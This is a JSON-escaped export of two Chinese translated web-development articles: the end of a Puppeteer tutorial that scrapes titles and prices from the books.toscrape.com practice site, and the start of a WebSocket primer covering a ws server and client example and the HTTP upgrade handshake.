class=\"hljs-keyword\"\u003elet\u003c/span\u003e price = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.querySelector(\u003cspan class=\"hljs-string\"\u003e'.price_color'\u003c/span\u003e).innerText;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样，标题和价格都有了，把它们放到一个对象里返回：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n  title,\n  price\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e回顾刚才的操作，我们获取到了标题和价格信息，将它们保存在一个对象里返回，返回结果赋给 \u003ccode\u003eresult\u003c/code\u003e 变量。所以，现在你的代码应该是这样：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e result = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e page.evaluate(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e title = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.querySelector(\u003cspan class=\"hljs-string\"\u003e'h1'\u003c/span\u003e).innerText;\n  \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e price = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.querySelector(\u003cspan class=\"hljs-string\"\u003e'.price_color'\u003c/span\u003e).innerText;\n\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n  title,\n  price\n}\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后只需要将 \u003ccode\u003eresult\u003c/code\u003e 返回即可，返回结果会打印到控制台：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e result;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e最后，综合起来代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e puppeteer = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'puppeteer'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e scrape = \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e () =\u0026gt; {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e browser = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e puppeteer.launch({\u003cspan class=\"hljs-attr\"\u003eheadless\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e});\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e page = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e browser.newPage();\n\n    \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e page.goto(\u003cspan class=\"hljs-string\"\u003e'http://books.toscrape.com/'\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e page.click(\u003cspan class=\"hljs-string\"\u003e'#default \u0026gt; div \u0026gt; div \u0026gt; div \u0026gt; div \u0026gt; section \u0026gt; div:nth-child(2) \u0026gt; ol \u0026gt; li:nth-child(1) \u0026gt; article \u0026gt; div.image_container \u0026gt; a \u0026gt; img'\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e page.waitFor(\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e);\n\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e result = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e page.evaluate(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n        \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e title = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.querySelector(\u003cspan class=\"hljs-string\"\u003e'h1'\u003c/span\u003e).innerText;\n        \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e price = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.querySelector(\u003cspan class=\"hljs-string\"\u003e'.price_color'\u003c/span\u003e).innerText;\n\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n            title,\n            price\n        }\n\n    });\n\n    browser.close();\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e result;\n};\n\nscrape().then(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003evalue\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(value); \u003cspan class=\"hljs-comment\"\u003e// Success!\u003c/span\u003e\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在控制台运行代码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003enode scrape.js\n\u003cspan class=\"hljs-comment\"\u003e// { title: 'A Light in the Attic', price: '£51.77' }\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e操作正确的话，在控制台会看到正确的输出结果，到此为止，你已经完成了 web 爬虫。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e例 3 —— 后期完善\u003c/h4\u003e\n\u003cp\u003e稍加思考一下你会发现，标题和价格信息是直接展示在首页的，所以，完全没必要进入详情页去抓取这些数据。既然这样，不妨再进一步思考，能否抓取所有书的标题和价格信息？\u003c/p\u003e\n\u003cp\u003e所以，抓取的方式其实有很多，需要你自己去发现。另外，上面提到的直接在主页抓取数据也不一定可行，因为有些标题可能会显示不全。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e拔高题\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e目标 —— 抓取主页所有书籍的标题和价格信息，并且用数组的形式保存返回。正确的输出应该是这样：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c0ef4b4dbf295?w=800\u0026amp;h=539\u0026amp;f=png\u0026amp;s=244831\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e开干吧，伙计，其实实现起来和上面的例子相差无几，如果你觉得实在太难，可以参考下面的提示。\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cstrong\u003e提示：\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e其实最大的区别在于你需要遍历整个结果集，代码的大致结构如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e result = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e page.evaluate(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e data = []; \u003cspan class=\"hljs-comment\"\u003e// 创建一个空数组\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e elements = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.querySelectorAll(\u003cspan class=\"hljs-string\"\u003e'xxx'\u003c/span\u003e); \u003cspan class=\"hljs-comment\"\u003e// 选择所有相关元素\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e// 遍历所有的元素\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 提取标题信息\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 提取价格信息\u003c/span\u003e\n    data.push({title, price}); \u003cspan class=\"hljs-comment\"\u003e// 将数据插入到数组中\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e data; \u003cspan class=\"hljs-comment\"\u003e// 返回数据集\u003c/span\u003e\n});\n\u003c/code\u003e\u003c/pre\u003e\u003chr\u003e\n\u003cp\u003e如果提示了还是做不出来的话，好吧，以下是参考答案。在以后的教程中，我会在下面这段代码的基础上再做一些拓展，同时也会涉及一些更高级的爬虫技术。你可以在 \u003ca target=\"_blank\" href=\"https://docs.google.com/forms/d/e/1FAIpQLSeQYYmBCBfJF9MXFmRJ7hnwyXvMwyCtHC5wxVDh5Cq--VT6Fg/viewform\"\u003e\u003cstrong\u003e这里\u003c/strong\u003e\u003c/a\u003e 提交你的邮箱地址进行订阅，有新的内容更新时我们会通知你。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e参考答案：\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e puppeteer = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'puppeteer'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e scrape = \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e () =\u0026gt; {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e browser = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e puppeteer.launch({\u003cspan class=\"hljs-attr\"\u003eheadless\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e});\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e page = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e browser.newPage();\n\n    \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e page.goto(\u003cspan class=\"hljs-string\"\u003e'http://books.toscrape.com/'\u003c/span\u003e);\n\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e result = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e page.evaluate(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n        \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e data = []; \u003cspan class=\"hljs-comment\"\u003e// 创建一个数组保存结果\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e elements = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.querySelectorAll(\u003cspan class=\"hljs-string\"\u003e'.product_pod'\u003c/span\u003e); \u003cspan class=\"hljs-comment\"\u003e// 选择所有书籍\u003c/span\u003e\n\n        \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e element \u003cspan class=\"hljs-keyword\"\u003eof\u003c/span\u003e elements){ \u003cspan class=\"hljs-comment\"\u003e// 遍历书籍列表\u003c/span\u003e\n            \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e title = element.childNodes[\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e].innerText; \u003cspan class=\"hljs-comment\"\u003e// 提取标题信息\u003c/span\u003e\n            \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e price = element.childNodes[\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e].children[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e].innerText; \u003cspan class=\"hljs-comment\"\u003e// 提取价格信息\u003c/span\u003e\n\n            data.push({title, price}); \u003cspan class=\"hljs-comment\"\u003e// 组合数据放入数组\u003c/span\u003e\n        }\n\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e data; \u003cspan class=\"hljs-comment\"\u003e// 返回数据集\u003c/span\u003e\n    });\n\n    browser.close();\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e result; \u003cspan class=\"hljs-comment\"\u003e// 返回数据\u003c/span\u003e\n};\n\nscrape().then(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003evalue\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(value); \u003cspan class=\"hljs-comment\"\u003e// 打印结果\u003c/span\u003e\n});\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e结语：\u003c/h3\u003e\n\u003cp\u003e谢谢观看！如果你有学习 NodeJS 的意向，可以移步 \u003ca target=\"_blank\" href=\"https://codeburst.io/learn-node-js-the-3-best-online-node-js-courses-87e5841f4c47\"\u003e\u003cstrong\u003eLearn Node JS — The 3 Best Online Node JS Courses\u003c/strong\u003e\u003c/a\u003e。\u003c/p\u003e\n\u003cp\u003e每周我都会发布 4 篇有关 web 开发的技术文章，\u003ca target=\"_blank\" href=\"https://docs.google.com/forms/d/e/1FAIpQLSeQYYmBCBfJF9MXFmRJ7hnwyXvMwyCtHC5wxVDh5Cq--VT6Fg/viewform\"\u003e\u003cstrong\u003e欢迎订阅\u003c/strong\u003e\u003c/a\u003e！或者你也可以在 Twitter 上 \u003ca target=\"_blank\" href=\"https://twitter.com/BrandonMorelli\"\u003e\u003cstrong\u003e关注我\u003c/strong\u003e\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner\"\u003e掘金翻译计划\u003c/a\u003e 是一个翻译优质互联网技术文章的社区，文章来源为 \u003ca target=\"_blank\" href=\"https://juejin.im\"\u003e掘金\u003c/a\u003e 上的英文分享文章。内容覆盖 \u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#android\"\u003eAndroid\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#ios\"\u003eiOS\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E5%89%8D%E7%AB%AF\"\u003e前端\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E5%90%8E%E7%AB%AF\"\u003e后端\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E5%8C%BA%E5%9D%97%E9%93%BE\"\u003e区块链\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E4%BA%A7%E5%93%81\"\u003e产品\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E8%AE%BE%E8%AE%A1\"\u003e设计\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD\"\u003e人工智能\u003c/a\u003e等领域，想要查看更多优质译文请持续关注 \u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner\"\u003e掘金翻译计划\u003c/a\u003e、\u003ca target=\"_blank\" href=\"http://weibo.com/juejinfanyi\"\u003e官方微博\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://zhuanlan.zhihu.com/juejinfanyi\"\u003e知乎专栏\u003c/a\u003e。\u003c/p\u003e\n\u003c/blockquote\u003e\n","buildTime":"1515151174.6044","__v":0}
{"_id":{"$oid":"5a4f5f6218646e1ee8be9905"},"id":"5a4e6a43f265da3e303c4787","author":{"$oid":"5a4f5f6218646e1ee8be98f1"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"WebSocket：5分钟从入门到精通","meta":{"likeCount":0},"tag":["Node.js","WebSocket"],"comment":[],"shortContent":"WebSocket的出现，使得浏览器具备了实时双向通信的能力。本文由浅入深，介绍了WebSocket如何建立连接、交换数据的细节，以及数据帧的格式。此外，还简要介绍了针对WebSocket的安全攻击，以及协议是如何抵御类似攻击的。 HTML5开始提供的一种浏览器与服务器进行全双…","content":"\u003ch2 class=\"heading\"\u003e一、内容概览\u003c/h2\u003e\n\u003cp\u003eWebSocket的出现，使得浏览器具备了实时双向通信的能力。本文由浅入深，介绍了WebSocket如何建立连接、交换数据的细节，以及数据帧的格式。此外，还简要介绍了针对WebSocket的安全攻击，以及协议是如何抵御类似攻击的。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e二、什么是WebSocket\u003c/h2\u003e\n\u003cp\u003eHTML5开始提供的一种浏览器与服务器进行全双工通讯的网络技术，属于应用层协议。它基于TCP传输协议，并复用HTTP的握手通道。\u003c/p\u003e\n\u003cp\u003e对大部分web开发者来说，上面这段描述有点枯燥，其实只要记住几点：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eWebSocket可以在浏览器里使用\u003c/li\u003e\n\u003cli\u003e支持双向通信\u003c/li\u003e\n\u003cli\u003e使用很简单\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 class=\"heading\"\u003e1、有哪些优点\u003c/h3\u003e\n\u003cp\u003e说到优点，这里的对比参照物是HTTP协议，概括地说就是：支持双向通信，更灵活，更高效，可扩展性更好。\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e支持双向通信，实时性更强。\u003c/li\u003e\n\u003cli\u003e更好的二进制支持。\u003c/li\u003e\n\u003cli\u003e较少的控制开销。连接创建后，ws客户端、服务端进行数据交换时，协议控制的数据包头部较小。在不包含头部的情况下，服务端到客户端的包头只有2~10字节（取决于数据包长度），客户端到服务端的的话，需要加上额外的4字节的掩码。而HTTP协议每次通信都需要携带完整的头部。\u003c/li\u003e\n\u003cli\u003e支持扩展。ws协议定义了扩展，用户可以扩展协议，或者实现自定义的子协议。（比如支持自定义压缩算法等）\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e对于后面两点，没有研究过WebSocket协议规范的同学可能理解起来不够直观，但不影响对WebSocket的学习和使用。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e2、需要学习哪些东西\u003c/h3\u003e\n\u003cp\u003e对网络应用层协议的学习来说，最重要的往往就是\u003cstrong\u003e连接建立过程\u003c/strong\u003e、\u003cstrong\u003e数据交换教程\u003c/strong\u003e。当然，数据的格式是逃不掉的，因为它直接决定了协议本身的能力。好的数据格式能让协议更高效、扩展性更好。\u003c/p\u003e\n\u003cp\u003e下文主要围绕下面几点展开：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e如何建立连接\u003c/li\u003e\n\u003cli\u003e如何交换数据\u003c/li\u003e\n\u003cli\u003e数据帧格式\u003c/li\u003e\n\u003cli\u003e如何维持连接\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 class=\"heading\"\u003e三、入门例子\u003c/h2\u003e\n\u003cp\u003e在正式介绍协议细节前，先来看一个简单的例子，有个直观感受。例子包括了WebSocket服务端、WebSocket客户端（网页端）。完整代码可以在 \u003ca target=\"_blank\" href=\"https://github.com/chyingp/blog/tree/master/demo/2017.05.22-web-socket/ws\"\u003e这里\u003c/a\u003e 找到。\u003c/p\u003e\n\u003cp\u003e这里服务端用了\u003ccode\u003ews\u003c/code\u003e这个库。相比大家熟悉的\u003ccode\u003esocket.io\u003c/code\u003e，\u003ccode\u003ews\u003c/code\u003e实现更轻量，更适合学习的目的。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e1、服务端\u003c/h3\u003e\n\u003cp\u003e代码如下，监听8080端口。当有新的连接请求到达时，打印日志，同时向客户端发送消息。当收到到来自客户端的消息时，同样打印日志。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e app = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'express'\u003c/span\u003e)();\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e server = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'http'\u003c/span\u003e).Server(app);\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e WebSocket = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'ws'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e wss = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e WebSocket.Server({ \u003cspan class=\"hljs-attr\"\u003eport\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e8080\u003c/span\u003e });\n\nwss.on(\u003cspan class=\"hljs-string\"\u003e'connection'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003econnection\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ews\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'server: receive connection.'\u003c/span\u003e);\n    \n    ws.on(\u003cspan class=\"hljs-string\"\u003e'message'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eincoming\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003emessage\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'server: received: %s'\u003c/span\u003e, message);\n    });\n\n    ws.send(\u003cspan class=\"hljs-string\"\u003e'world'\u003c/span\u003e);\n});\n\napp.get(\u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003ereq, res\u003c/span\u003e) \u003c/span\u003e{\n  res.sendfile(__dirname + \u003cspan class=\"hljs-string\"\u003e'/index.html'\u003c/span\u003e);\n});\n\napp.listen(\u003cspan class=\"hljs-number\"\u003e3000\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e2、客户端\u003c/h3\u003e\n\u003cp\u003e代码如下，向8080端口发起WebSocket连接。连接建立后，打印日志，同时向服务端发送消息。接收到来自服务端的消息后，同样打印日志。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs htmlbars\" lang=\"htmlbars\"\u003e\u003cspan class=\"xml\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e ws = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e WebSocket(\u003cspan class=\"hljs-string\"\u003e'ws://localhost:8080'\u003c/span\u003e);\n  ws.onopen = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'ws onopen'\u003c/span\u003e);\n    ws.send(\u003cspan class=\"hljs-string\"\u003e'from client: hello'\u003c/span\u003e);\n  };\n  ws.onmessage = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003ee\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'ws onmessage'\u003c/span\u003e);\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'from server: '\u003c/span\u003e + e.data);\n  };\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e3、运行结果\u003c/h3\u003e\n\u003cp\u003e可分别查看服务端、客户端的日志，这里不展开。\u003c/p\u003e\n\u003cp\u003e服务端输出：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eserver: receive connection.\nserver: received hello\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e客户端输出：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eclient: ws connection is open\nclient: received world\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e四、如何建立连接\u003c/h2\u003e\n\u003cp\u003e前面提到，WebSocket复用了HTTP的握手通道。具体指的是，客户端通过HTTP请求与WebSocket服务端协商升级协议。协议升级完成后，后续的数据交换则遵照WebSocket的协议。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e1、客户端：申请协议升级\u003c/h3\u003e\n\u003cp\u003e首先，客户端发起协议升级请求。可以看到，采用的是标准的HTTP报文格式，且只支持\u003ccode\u003eGET\u003c/code\u003e方法。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs http\" lang=\"http\"\u003e\u003cspan class=\"hljs-keyword\"\u003eGET\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e/\u003c/span\u003e HTTP/1.1\n\u003cspan class=\"hljs-attribute\"\u003eHost\u003c/span\u003e: localhost:8080\n\u003cspan class=\"hljs-attribute\"\u003eOrigin\u003c/span\u003e: http://127.0.0.1:3000\n\u003cspan class=\"hljs-attribute\"\u003eConnection\u003c/span\u003e: Upgrade\n\u003cspan class=\"hljs-attribute\"\u003eUpgrade\u003c/span\u003e: websocket\n\u003cspan class=\"hljs-attribute\"\u003eSec-WebSocket-Version\u003c/span\u003e: 13\n\u003cspan class=\"hljs-attribute\"\u003eSec-WebSocket-Key\u003c/span\u003e: w4v7O6xFTi36lq3RNcgctw==\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e重点请求首部意义如下：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eConnection: Upgrade\u003c/code\u003e：表示要升级协议\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eUpgrade: websocket\u003c/code\u003e：表示要升级到websocket协议。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eSec-WebSocket-Version: 13\u003c/code\u003e：表示websocket的版本。如果服务端不支持该版本，需要返回一个\u003ccode\u003eSec-WebSocket-Version\u003c/code\u003eheader，里面包含服务端支持的版本号。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eSec-WebSocket-Key\u003c/code\u003e：与后面服务端响应首部的\u003ccode\u003eSec-WebSocket-Accept\u003c/code\u003e是配套的，提供基本的防护，比如恶意的连接，或者无意的连接。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e注意，上面请求省略了部分非重点请求首部。由于是标准的HTTP请求，类似Host、Origin、Cookie等请求首部会照常发送。在握手阶段，可以通过相关请求首部进行 安全限制、权限校验等。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e2、服务端：响应协议升级\u003c/h3\u003e\n\u003cp\u003e服务端返回内容如下，状态代码\u003ccode\u003e101\u003c/code\u003e表示协议切换。到此完成协议升级，后续的数据交互都按照新的协议来。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs http\" lang=\"http\"\u003eHTTP/1.1 101 Switching Protocols\nConnection:Upgrade\nUpgrade: websocket\nSec-WebSocket-Accept: Oy4NRAQ13jhfONC7bP8dTKb4PTU=\n\n\u003c/code\u003e\u003c/pre\u003e\u003cblockquote\u003e\n\u003cp\u003e备注：每个header都以\u003ccode\u003e\\r\\n\u003c/code\u003e结尾，并且最后一行加上一个额外的空行\u003ccode\u003e\\r\\n\u003c/code\u003e。此外，服务端回应的HTTP状态码只能在握手阶段使用。过了握手阶段后，就只能采用特定的错误码。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e3、Sec-WebSocket-Accept的计算\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eSec-WebSocket-Accept\u003c/code\u003e根据客户端请求首部的\u003ccode\u003eSec-WebSocket-Key\u003c/code\u003e计算出来。\u003c/p\u003e\n\u003cp\u003e计算公式为：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e将\u003ccode\u003eSec-WebSocket-Key\u003c/code\u003e跟\u003ccode\u003e258EAFA5-E914-47DA-95CA-C5AB0DC85B11\u003c/code\u003e拼接。\u003c/li\u003e\n\u003cli\u003e通过SHA1计算出摘要，并转成base64字符串。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e伪代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u0026gt;toBase64( sha1( Sec-WebSocket-Key + \u003cspan class=\"hljs-number\"\u003e258\u003c/span\u003eEAFA5-E914\u003cspan 